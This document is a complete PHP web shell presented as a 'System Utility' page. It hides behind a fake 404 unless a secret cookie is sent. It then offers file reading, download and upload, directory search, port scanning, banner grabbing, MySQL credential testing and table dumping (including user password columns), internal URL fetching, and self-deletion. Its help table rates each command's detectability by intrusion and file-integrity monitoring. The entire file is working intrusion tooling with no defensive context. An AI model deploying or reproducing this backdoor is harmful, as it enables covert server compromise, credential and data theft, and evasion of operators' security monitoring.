<?php
$cookie_name  = "sessId";
$secret_value = "7f88219c9e83a696";

if (!isset($_COOKIE[$cookie_name]) || $_COOKIE[$cookie_name] !== $secret_value) {
    header('HTTP/1.1 404 Not Found');
    echo "<h1>Not Found</h1><p>The requested URL was not found on this server.</p>";
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
    $p = explode(' ', trim($_POST['act']));
    $action = $p[0]; 
    $target = isset($p[1]) ? $p[1] : '.';
    $arg1 = isset($p[2]) ? $p[2] : ''; 
    $arg2 = isset($p[3]) ? $p[3] : ''; 
    $arg3 = isset($p[4]) ? $p[4] : '';
    $out = "";

    // Helper for DB actions to reduce footprint
    $dbInit = function($dbn = '') use ($target, $arg1, $arg2) {
        $hp = explode(':', $target);
        return @new mysqli($hp[0], $arg1, $arg2, $dbn, isset($hp[1]) ? (int)$hp[1] : 3306);
    };

    try {
        switch ($action) {
            case 'download':
                if (is_readable($target) && !is_dir($target)) {
                    while (ob_get_level()) ob_end_clean();
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="'.basename($target).'"');
                    readfile($target); exit;
                } $out = "Unreadable."; break;
            case 'dir':
                $t = ($target === '..') ? dirname(getcwd()) : $target;
                $l = @scandir($t);
                $out = ($l !== false) ? implode("\n", $l) : (is_dir($t) ? "No Access." : "Not found.");
                break;
            case 'read': $out = is_readable($target) ? file_get_contents($target) : "Permission denied or file doesn't exist."; break;
            case 'upload': $out = file_put_contents($target, base64_decode($arg1)) !== false ? "OK." : "Error."; break;
            case 'find':
                $found = array();
                try {
                    $dir = new RecursiveDirectoryIterator($target, 4096);
                    $it = new RecursiveIteratorIterator($dir, 1, 512);
                    foreach (@$it as $f) { 
                        if ($arg1 === '' || stripos($f->getFilename(), $arg1) !== false) {
                            $found[] = $f->getPathname(); 
                        }
                    }
                    $out = empty($found) ? "No results." : implode("\n", $found);
                } catch (Exception $e) { 
                    $out = "Search failed. Permission issue."; 
                }
                break;
            case 'stat':
                if (!file_exists($target)) { $out = "Invalid."; break; }
                $perm = fileperms($target);
                $out = "Path:  ".realpath($target)."\n";
                $out .= "Perms: ".substr(sprintf('%o', $perm), -4)."\n";
                $out .= "R/W:   ".(is_readable($target)?'Y':'N')."/".(is_writable($target)?'Y':'N');
                if (function_exists('posix_getpwuid')) {
                    $u = posix_getpwuid(fileowner($target));
                    $g = posix_getgrgid(filegroup($target));
                    $out .= "\nOwner: ".(isset($u['name'])?$u['name']:'?').":".(isset($g['name'])?$g['name']:'?');
                }
                break;
            case 'port_scan':
                $hp = explode(':', $target); 
                $c = @fsockopen($hp[0], isset($hp[1]) ? $hp[1] : 80, $en, $es, 2);
                $out = $c ? "Port ".(isset($hp[1])?$hp[1]:80)." Open" : "Port ".(isset($hp[1])?$hp[1]:80)." Closed"; if($c) fclose($c); break;
            case 'service_banner':
                $hp = explode(':', $target);
                $c = @fsockopen($hp[0], isset($hp[1]) ? $hp[1] : 21, $en, $es, 3);
                if ($c) {
                    $out = trim(fread($c, 1024)) ?: "[Connected, no banner]";
                    fclose($c);
                } else $out = "Unreachable."; break;
            case 'db_auth':
                $db = $dbInit(); $out = $db->connect_errno ? "Failed: ".$db->connect_error : "Success: Logged in as ".$arg1; break;
            case 'db_list':
                $db = $dbInit(); $res = $db->query("SHOW DATABASES");
                while($r = @$res->fetch_array()) $out .= $r[0]."\n"; break;
            case 'db_tables':
                $db = $dbInit($arg3); 
                if ($res = @$db->query("SHOW TABLES")) {
                    while($r = $res->fetch_array()) $out .= $r[0]."\n";
                } else { $out = "Query error."; }
                $db->close(); break;
            case 'db_describe':
                if (empty($p[5])) { $out = "Table required."; break; }
                $db = $dbInit($arg3);
                if ($res = @$db->query("DESCRIBE $p[5]")) {
                    while ($r = $res->fetch_assoc()) $out .= $r['Field']." (".$r['Type'].")\n";
                    $res->free();
                } else { $out = "Error: ".$db->error; }
                $db->close(); break;
            case 'db_query':
                if (empty($p[6])) { $out = "Usage: [db] [tbl] [cols]"; break; }
                $db = $dbInit($p[4]); 
                $m = (int)(isset($p[8]) ? $p[8] : 50); 
                $o = ((int)(isset($p[7]) ? $p[7] : 0)) * $m;
                if ($res = @$db->query("SELECT $p[6] FROM $p[5] LIMIT $o,$m")) {
                    $f = 1; while ($r = $res->fetch_assoc()) {
                        if ($f) { $out .= implode(",", array_keys($r))."\n".str_repeat("-", 20)."\n"; $f = 0; }
                        $out .= implode(",", array_values($r))."\n";
                    }
                    $out = $out ?: "[No rows]"; $res->free();
                } else { $out = "Error: ".$db->error; }
                $db->close(); break;
            case 'dns': $out = filter_var($target, 273) ? (gethostbyaddr($target) ?: "No PTR") : (gethostbyname($target) ?: "Fail"); break;
            case 'fetch':
                $ch = curl_init($target);
                curl_setopt_array($ch, array(19913=>1, 64=>0, 13=>5, 10018=>'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'));
                $out = curl_exec($ch) ?: curl_error($ch); curl_close($ch); break;
            case 'self_destruct': if ($target==='DELETEME') @unlink(__FILE__); exit;
            case 'help':
                $m = array(
                    array('dir [path]', 'List directory', 'dir /var/www/html', 'Low: Standard filesystem read'),
                    array('stat [path]', 'Check permission', 'stat /var/www/html', 'Low: Native metadata syscall'),
                    array('read [file]', 'Read file', 'read /var/www/html/config.php', 'Low: Internal PHP stream read'),
                    array('find [path] [keyword]', 'Search for filename', 'find /var/www config', 'Med: High CPU/Disk IO if path is large'),
                    array('download [file]', 'Download file', 'download /var/www/html/config.php', 'Med: File transfer in HTTP logs'),
                    array('upload [path] [b64]', 'Upload file', 'upload /var/www/html/test.txt b64', 'High: Disk write. Detectable by FIM'),
                    array('db_auth [h:p] [u] [p]', 'MySQL auth', 'db_auth 127.0.0.1:3306 root pass', 'Med: Failed logins logged by MySQL'),
                    array('db_list [h:p] [u] [p]', 'List DBs', 'db_list 127.0.0.1:3306 root pass', 'Low: Standard authenticated query'),
                    array('db_tables [h:p] [u] [p] [db]', 'List tables', 'db_tables 127.0.0.1:3306 root pass mysql', 'Low: Standard authenticated query'),
                    array('db_describe [h:p] [u] [p] [db] [tbl]', 'List table schema/columns', 'db_describe 127.0.0.1:3306 root pass mysql user', 'Low: Standard authenticated query'),
                    array('db_query [h:p] [u] [p] [db] [tbl] [cols] [pages] [rows]', 'SQL SELECT query', 'db_query 127.0.0.1:3306 root pass mysql user User,Password 0 500', 'Med: Large queries may trigger WAF'),
                    array('fetch [url]', 'HTTP request', 'fetch http://internal.site', 'Med: Request logged by target server'),
                    array('port_scan [h:p]', 'Port check', 'port_scan 127.0.0.1:3306', 'Med: Rapid connections can trigger IDS'),
                    array('service_banner [h:p]', 'Get banner', 'service_banner 127.0.0.1:21', 'Low: Passive socket connection'),
                    array('dns [target]', 'DNS lookup', 'dns dc.int.site', 'Low: Standard OS resolver call'),
                    array('self_destruct', 'Delete script', 'self_destruct DELETEME', 'High: File deletion.  Detectable by FIM'),
                    array('clear', 'Clear screen', 'clear', 'Low: Browser JavaScript only')
                );
                $out = str_pad("COMMAND", 60) . str_pad("DESCRIPTION", 30) . str_pad("EXAMPLE", 70) . "OPSEC\n";
                $out .= str_repeat("-", 200) . "\n";
                foreach($m as $i) {
                    $out .= str_pad($i[0], 60) . str_pad($i[1], 30) . str_pad($i[2], 70) . $i[3] . "\n";
                }
                break;
            default: $out = "Unknown command. Run 'help'.";
        }

    } catch (Exception $e) {
        $out = "Runtime Error: " . $e->getMessage();
    }
    echo json_encode(array('output' => nl2br(htmlentities($out, ENT_QUOTES, 'UTF-8')), 'user' => get_current_user(), 'cwd' => getcwd(), 'ip' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : ''));
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Utility</title>
    <style>
        body { background: #121212; color: #e0e0e0; font-family: 'Consolas', monospace; font-size: 13px; margin: 0; display: flex; flex-direction: column; height: 100vh; }
        #header { background: #1e1e1e; padding: 10px 15px; border-bottom: 1px solid #333; color: #4caf50; font-weight: bold; display: flex; justify-content: space-between; align-items: center; }
        #out { padding: 15px; flex-grow: 1; overflow-y: auto; white-space: pre-wrap; scroll-behavior: smooth; }
        .bar { background: #1e1e1e; border-top: 1px solid #333; padding: 8px 15px; display: flex; box-sizing: border-box; }
        input { background: transparent; border: none; color: #4caf50; width: 100%; outline: none; font-family: inherit; font-size: inherit; }
        button { background: #333; color: #ccc; border: 1px solid #444; font-size: 11px; cursor: pointer; padding: 4px 10px; border-radius: 3px; }
        button:hover { background: #444; color: #fff; }
    </style>
</head>
<body>
    <div id="header">
        <div>USER: <?php echo get_current_user(); ?> | IP: <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '127.0.0.1'; ?> | CWD: <span id="cwd-display"><?php echo getcwd(); ?></span> | System Utility</div>
        <button onclick="exportLog()">Export Log</button>
    </div>
    <div id="out">System Utility [Ready]
Type 'help' for service utility list.</div>
    <div class="bar">
        <span style="color:#888; margin-right:10px;">#</span>
        <input type="text" id="in" autocomplete="off" autofocus>
    </div>

    <script>
        let history = JSON.parse(sessionStorage.getItem('cmd_history') || "[]");
        let historyIdx = -1;
        let currentInput = ""; 
        const input = document.getElementById('in');
        const out = document.getElementById('out');
        const cwdDisplay = document.getElementById('cwd-display');

        function exportLog() {
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const blob = new Blob([out.innerText], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `console_log_${timestamp}.txt`;
            a.click();
        }

        input.addEventListener('keydown', function(e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIdx === -1) currentInput = input.value; 
                if (historyIdx < history.length - 1) {
                    historyIdx++;
                    input.value = history[historyIdx];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIdx > -1) {
                    historyIdx--;
                    input.value = historyIdx === -1 ? currentInput : history[historyIdx];
                }
            }

            if (e.key === 'Enter') {
                const val = input.value;
                if (!val.trim()) return;

                if (val !== history[0]) {
                    history.unshift(val);
                }
                historyIdx = -1; 
                sessionStorage.setItem('cmd_history', JSON.stringify(history));
                if (val.trim() === 'clear') { 
                    out.innerHTML = 'Console cleared.\n'; 
                    input.value = ''; 
                    return; 
                }

                out.innerHTML += `\n<span style="color:#777"># ${val}</span>\n`;
                const fd = new FormData();
                fd.append('act', val);

                fetch('', { method: 'POST', body: fd })
                .then(res => {
                    const disp = res.headers.get('Content-Disposition');
                    if (disp && disp.indexOf('attachment') !== -1) {
                        return res.blob().then(blob => {
                            const url = window.URL.createObjectURL(blob);
                            const a = document.createElement('a'); a.href = url;
                            a.download = disp.split('filename=')[1].replace(/"/g, '');
                            document.body.appendChild(a); a.click(); a.remove();
                            return { output: "Download complete." };
                        });
                    }
                    return res.json();
                })
                .then(data => {
                    if (data.output) out.innerHTML += data.output + "\n";
                    if (data.cwd) cwdDisplay.innerText = data.cwd;
                    input.value = '';
                    out.scrollTop = out.scrollHeight;
                }).catch(err => {
                    out.innerHTML += `<span style="color:red">Connection Error: ${err}</span>\n`;
                });
            }
        });
    </script>
</body>
</html>
